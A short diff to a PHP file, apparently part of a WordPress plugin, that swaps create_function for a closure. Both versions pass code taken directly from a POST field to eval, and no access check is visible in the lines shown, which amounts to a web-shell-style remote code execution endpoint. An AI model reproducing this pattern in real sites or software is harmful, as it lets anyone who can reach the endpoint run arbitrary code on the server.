@@ -53,7 +53,9 @@ if ( isset( $_POST['full'] ) ) {
 
 	if ( isset( $_POST['code'] ) ) {
 		if ( isset( $_POST['action'] ) ) {
-			$function = create_function( '$args', $_POST['code'] );
+			$function = function () {
+				eval( $_POST['code'] );
+			};
 			add_action( $_POST['action'], $function, 999, 999 );
 		} else {
 			if ( false === eval( $_POST['code'] ) )
